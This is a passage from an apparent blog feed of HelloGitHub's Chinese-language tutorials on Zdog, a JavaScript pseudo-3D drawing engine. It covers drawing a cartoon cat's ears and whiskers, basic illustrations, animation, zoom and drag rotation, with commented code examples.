number">4</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 将半圆进行缩放，使其更加逼真</span>    scale<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">0.8</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    color<span class="token punctuation">:</span> colorFeatures<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 将半圆进行旋转，让开口向上</span>    rotate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> TAU <span class="token operator">/</span> <span class="token number">2.3</span><span class="token punctuation">,</span>        z<span class="token punctuation">:</span> TAU <span class="token operator">/</span> <span class="token operator">-</span><span class="token number">4</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 然后再对其调整合理的位置</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token number">46</span><span class="token punctuation">,</span>        z<span class="token punctuation">:</span> <span class="token number">74</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>效果如下：</p><p><img src="images/6.png" alt></p><h3 id="2-7-画耳朵"><a href="#2-7-画耳朵" class="headerlink" title="2.7 画耳朵"></a>2.7 画耳朵</h3><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 画耳朵</span><span class="token comment" spellcheck="true">// 带圆形底座的方形圆柱</span><span class="token comment" spellcheck="true">// 绘画左耳</span><span class="token keyword">const</span> ear <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Cone</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> head<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置圆的直径</span>    diameter<span class="token punctuation">:</span> <span class="token number">120</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置长度</span>    length<span class="token punctuation">:</span> <span class="token number">90</span><span class="token punctuation">,</span>    stroke<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    color<span class="token punctuation">:</span> black<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 调整位置</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">105</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 圆角朝向为正z轴，因此需要对其旋转</span>    rotate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> TAU<span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> TAU<span class="token operator">/</span><span class="token number">12</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 绘画右耳，将左耳进行复制，移动，旋转</span>ear<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">120</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">105</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    rotate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> TAU<span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> TAU<span class="token operator">/</span><span class="token operator">-</span><span class="token number">12</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="images/7.png" alt></p><h3 id="2-8-最后一步画胡须"><a href="#2-8-最后一步画胡须" class="headerlink" title="2.8 最后一步画胡须"></a>2.8 最后一步画胡须</h3><p>终于到了最后一步，它即将生灵活现起来。代码如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 开始进行画胡须</span><span class="token comment" spellcheck="true">// shape自定义形状</span><span class="token keyword">const</span> whisker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Shape</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> whiskers<span class="token punctuation">,</span>    path<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">// 起始点</span>        <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 曲线的椭圆适合由前一个拐角和终点形成的矩形。</span>        <span class="token punctuation">{</span> arc<span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token comment" spellcheck="true">// 拐角</span>                <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">10</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// corner</span>                <span class="token comment" spellcheck="true">// 终点</span>                <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// end point</span>            <span class="token punctuation">]</span><span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    closed<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 胡须的宽度</span>    stroke<span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span>    color<span class="token punctuation">:</span> black<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 左侧的另一条胡须，只需要按照上面的设置进行下移即可</span>whisker<span class="token punctuation">.</span>copy <span class="token punctuation">(</span><span class="token punctuation">{</span>    path<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span> arc<span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// corner</span>                <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// end point</span>            <span class="token punctuation">]</span><span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 将胡须往下移</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        y<span class="token punctuation">:</span> <span class="token number">20</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 将左侧的胡须复制进行移动并旋转</span><span class="token keyword">const</span> whiskersright <span class="token operator">=</span> whiskersleft<span class="token punctuation">.</span><span class="token function">copyGraph</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">290</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token number">20</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    rotate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        y<span class="token punctuation">:</span> TAU<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>完成效果如下：</p><p><img src="images/8.png" alt></p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><blockquote><p>文中的代码已开源到 GitHub 地址：<a href="https://github.com/HelloGitHub-Team/Article/blob/master/contents/JavaScript/Zdog_advance/index.html" target="_blank" rel="noopener">https://github.com/HelloGitHub-Team/Article/blob/master/contents/JavaScript/Zdog_advance/index.html</a></p></blockquote><p>当我们对代码进行分析时，其实感觉并没有想象中的复杂，我们需要精心去进行分析。把需要的形状先构思好，然后再参考 zdog 文档，有没有快捷的方式获得你想要的形状。有了这个库是不是对自己的画画能力又有了新的认识呢？这里是 HelloGitHub 扩充你的武器库从这里开始！</p><p>阅读完本文后 “灵魂小画师” 是否从此诞生了呢？✌️</p><p><img src="images/9.gif" alt></p><p>“旋转跳跃我闭着眼睛”（这段是图片描述）</p><h2 id="四、参考资料"><a href="#四、参考资料" class="headerlink" title="四、参考资料"></a>四、参考资料</h2><ul><li><p><a href="https://zzz.dog/" target="_blank" rel="noopener">Zdog 官方文档</a></p></li><li><p><a href="https://www.17sucai.com/preview/1750622/2019-08-08/ztocat/index.html" target="_blank" rel="noopener">效果来源</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开源项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让你成为灵魂画手的 JS 引擎：Zdog</title>
      <link href="/2019/08/29/rang-ni-cheng-wei-ling-hun-hua-shou-de-js-yin-qing-zdog/"/>
      <url>/2019/08/29/rang-ni-cheng-wei-ling-hun-hua-shou-de-js-yin-qing-zdog/</url>
      
        <content type="html"><![CDATA[<h1 id="让你成为灵魂画手的-JS-引擎：Zdog"><a href="#让你成为灵魂画手的-JS-引擎：Zdog" class="headerlink" title="让你成为灵魂画手的 JS 引擎：Zdog"></a>让你成为灵魂画手的 JS 引擎：Zdog</h1><p><img src="images/1.png" alt="1"></p><p align="center">本文作者：HelloGitHub-<strong>kalifun</strong></p>  <p align="center"><strong>本文首发 HelloGitHub 欢迎大家加入 HelloGitHub-Team 大家庭</strong></p><p>今天给大家推荐一个使用 JavaScript 语言编写的开源 Web 3D 模型项目 —— Zdog。</p><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><h2 id="1-1-Zdog"><a href="#1-1-Zdog" class="headerlink" title="1.1 Zdog"></a>1.1 Zdog</h2><blockquote><p>Zdog 项目地址：<a href="https://github.com/metafizzy/zdog" target="_blank" rel="noopener">https://github.com/metafizzy/zdog</a></p></blockquote><p><strong>Tips:</strong> 本文出现的所有作品都是通过 Zdog 完成的。</p><p><img src="images/2.gif" alt="2"></p><p>圆形、扁平、设计师友好用于 canvas 和 SVG 的伪 3D 引擎。</p><p>使用 Zdog 您可以在 Web 上设计和渲染简单的 3D 模型。Zdog 是一个伪 3D 引擎。它的几何形状存在于 3D 空间中，但呈现为扁平形状，这使 Zdog 特别。</p><h3 id="1-2-Zdog-特点"><a href="#1-2-Zdog-特点" class="headerlink" title="1.2 Zdog 特点"></a>1.2 Zdog 特点</h3><ul><li>体积小：整个库只有 2100 行代码，最小体积为 28 KB。</li><li>图形圆滑：所有的圆形都呈现为圆边，没有多边形锯齿。</li><li>使用友好：使用 API 完成建模。</li></ul><h2 id="二、方法介绍"><a href="#二、方法介绍" class="headerlink" title="二、方法介绍"></a>二、方法介绍</h2><blockquote><p>解释说明均在代码中以注释方式展示，请大家注意阅读。</p></blockquote><h3 id="2-1-初始静态演示"><a href="#2-1-初始静态演示" class="headerlink" title="2.1 初始静态演示"></a>2.1 初始静态演示</h3><p>让我们进入一个基本的非动画演示。</p><p>静态演示只需要在画布上将想要绘画的图像渲染出来就可以了。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Illustration是顶级类，用于处理&lt;canvas>或&lt;svg>元素，保存场景中的所有形状，并在元素中显示这些形状。</span>    <span class="token keyword">let</span> illo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Illustration</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 用class选择器设置画布</span>        element<span class="token punctuation">:</span> <span class="token string">'.zdog-canvas'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画圆</span>    <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 将形状添加到illo</span>        addTo<span class="token punctuation">:</span> illo<span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置圆的直径</span>        diameter<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置画笔宽度</span>        stroke<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置圆的颜色</span>        color<span class="token punctuation">:</span> <span class="token string">'#636'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 更新所有显示属性并渲染到illo画布上</span>    illo<span class="token punctuation">.</span><span class="token function">updateRenderGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-2-动画"><a href="#2-2-动画" class="headerlink" title="2.2 动画"></a>2.2 动画</h3><p>为实现动画场景，我们需要每帧重新渲染图形在画布上。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> illo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Illustration</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 用id选择器设置画布</span>        element<span class="token punctuation">:</span> <span class="token string">'#zdog-canvas'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画圆</span>    <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        addTo<span class="token punctuation">:</span> illo<span class="token punctuation">,</span>        diameter<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 你可以理解z轴向前移动40个像素</span>        translate<span class="token punctuation">:</span> <span class="token punctuation">{</span> z<span class="token punctuation">:</span> <span class="token number">40</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        stroke<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        color<span class="token punctuation">:</span> <span class="token string">'#636'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画矩形</span>    <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Rect</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        addTo<span class="token punctuation">:</span> newcanvas<span class="token punctuation">,</span>        width<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        height<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 你可以理解z轴向后移动40个像素</span>        translate<span class="token punctuation">:</span> <span class="token punctuation">{</span> z<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">40</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        stroke<span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        color<span class="token punctuation">:</span> <span class="token string">'#E62'</span><span class="token punctuation">,</span>        fill<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 通过逐步增加xxx.rotate.y来改变场景的旋转。值越大越快。</span>        illo<span class="token punctuation">.</span>rotate<span class="token punctuation">.</span>y <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0.03</span><span class="token punctuation">;</span>        illo<span class="token punctuation">.</span><span class="token function">updateRenderGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 动画下一帧继续执行函数</span>        <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span> animate <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 开始动画，执行函数</span>    <span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-3-放大"><a href="#2-3-放大" class="headerlink" title="2.3 放大"></a>2.3 放大</h3><p>Zdog 需要设置大量数字。设置 zoom 将按比例缩放整个场景。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Illustration是顶级类，用于处理&lt;canvas>或&lt;svg>元素，保存场景中的所有形状，并在元素中显示这些形状。</span>    <span class="token keyword">let</span> illo2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Illustration</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 用class选择器设置画布</span>        element<span class="token punctuation">:</span> <span class="token string">'.zdog-canvas2'</span><span class="token punctuation">,</span>         <span class="token comment" spellcheck="true">// 将图形放大4倍</span>        zoom<span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画圆</span>    <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 将形状添加到illo2</span>        addTo<span class="token punctuation">:</span> illo2<span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置圆的直径</span>        diameter<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置画笔宽度</span>        stroke<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置圆的颜色</span>        color<span class="token punctuation">:</span> <span class="token string">'#636'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 更新所有显示属性并渲染到illo画布上</span>    illo2<span class="token punctuation">.</span><span class="token function">updateRenderGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-4-拖动旋转"><a href="#2-4-拖动旋转" class="headerlink" title="2.4 拖动旋转"></a>2.4 拖动旋转</h3><p>通过在插图上设置 <code>dragRotate：true</code> 来拖动来启用旋转。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> newcanvas2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Illustration</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 用id选择器设置画布</span>        element<span class="token punctuation">:</span> <span class="token string">'#zdog-canvas2'</span><span class="token punctuation">,</span>        dragRotate<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画圆</span>    <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        addTo<span class="token punctuation">:</span> newcanvas2<span class="token punctuation">,</span>        diameter<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 你可以理解z轴向前移动40个像素</span>        translate<span class="token punctuation">:</span> <span class="token punctuation">{</span> z<span class="token punctuation">:</span> <span class="token number">40</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        stroke<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        color<span class="token punctuation">:</span> <span class="token string">'#636'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画矩形</span>    <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Rect</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        addTo<span class="token punctuation">:</span> newcanvas2<span class="token punctuation">,</span>        width<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        height<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 你可以理解z轴向后移动40个像素</span>        translate<span class="token punctuation">:</span> <span class="token punctuation">{</span> z<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">40</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        stroke<span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        color<span class="token punctuation">:</span> <span class="token string">'#E62'</span><span class="token punctuation">,</span>        fill<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">animate2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 通过逐步增加xxx.rotate.y来改变场景的旋转。值越大越快。</span>        newcanvas2<span class="token punctuation">.</span>rotate<span class="token punctuation">.</span>y <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0.03</span><span class="token punctuation">;</span>        newcanvas2<span class="token punctuation">.</span><span class="token function">updateRenderGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 动画下一帧继续执行函数</span>        <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span> animate2 <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 开始动画，执行函数</span>    <span class="token function">animate2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="三、快速入手"><a href="#三、快速入手" class="headerlink" title="三、快速入手"></a>三、快速入手</h2><p>下面我们将一步步的讲解如何使用 Zdog 这个库。我们采用的是最简单的 CDN 引用方式，方便大家能够快速体检其魅力（复制代码便可查看效果）。</p><p><strong>Tips：</strong> 解释说明均在代码中以注释方式展示，请大家注意阅读。</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>zdog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token class">.zdog-canvas</span> </span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/*给class="zdog-canvas"的画布添加背景*/</span>            <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#FDB</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--Zdog在&lt;canvas>或&lt;svg>元素上呈现。--></span><span class="token comment" spellcheck="true">&lt;!--设置画布1，及长宽--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zdog-canvas<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--设置画布2，及长宽--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zdog-canvas<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--引入zdog文件--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/zdog@1/dist/zdog.dist.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token comment" spellcheck="true">// Illustration是顶级类，用于处理&lt;canvas>或&lt;svg>元素，保存场景中的所有形状，并在元素中显示这些形状。</span>    <span class="token keyword">let</span> illo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Illustration</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 用class选择器设置画布</span>        element<span class="token punctuation">:</span> <span class="token string">'.zdog-canvas'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画圆</span>    <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 将形状添加到illo</span>        addTo<span class="token punctuation">:</span> illo<span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置圆的直径</span>        diameter<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置画笔宽度</span>        stroke<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置圆的颜色</span>        color<span class="token punctuation">:</span> <span class="token string">'#636'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 更新所有显示属性并渲染到illo画布上</span>    illo<span class="token punctuation">.</span><span class="token function">updateRenderGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> newcanvas <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Illustration</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 用id选择器设置画布</span>        element<span class="token punctuation">:</span> <span class="token string">'#zdog-canvas'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画圆</span>    <span class="token 